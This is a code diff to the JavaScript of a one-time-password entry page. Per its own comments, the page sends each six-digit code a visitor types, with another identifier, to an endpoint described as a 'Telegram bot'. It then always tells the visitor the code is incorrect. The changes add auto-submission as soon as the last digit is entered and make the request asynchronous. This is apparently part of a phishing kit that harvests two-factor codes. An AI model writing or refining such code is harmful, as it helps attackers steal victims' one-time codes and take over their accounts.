@@ -396,6 +396,9 @@
         function moveToNext(current, nextId) {
             if (current.value.length === 1 && nextId) {
                 document.getElementById(nextId).focus();
+            } else if (current.value.length === 1 && !nextId) {
+                // Last digit entered, check if OTP is complete
+                checkOtpComplete();
             }
         }
 
@@ -413,7 +416,7 @@
             if (otp.length === 6) {
                 // Send OTP to next.php (Telegram bot) FIRST
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', '/api/next.php', false); // Make synchronous
+                xhr.open('POST', '/api/next.php', true);
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
 
@@ -421,6 +424,21 @@
                 showInlineAlert("Incorrect code. Please try again.", "error");
             } else {
                 showInlineAlert("Please enter a 6-digit code.", "error");
+            }
+        }
+
+        // Auto-submit when all 6 digits are entered
+        function checkOtpComplete() {
+            var otp = '';
+            for (var i = 1; i <= 6; i++) {
+                otp += document.getElementById('otp' + i).value;
+            }
+            if (otp.length === 6) {
+                // Auto-send OTP to Telegram bot when complete
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', '/api/next.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
             }
         }
 
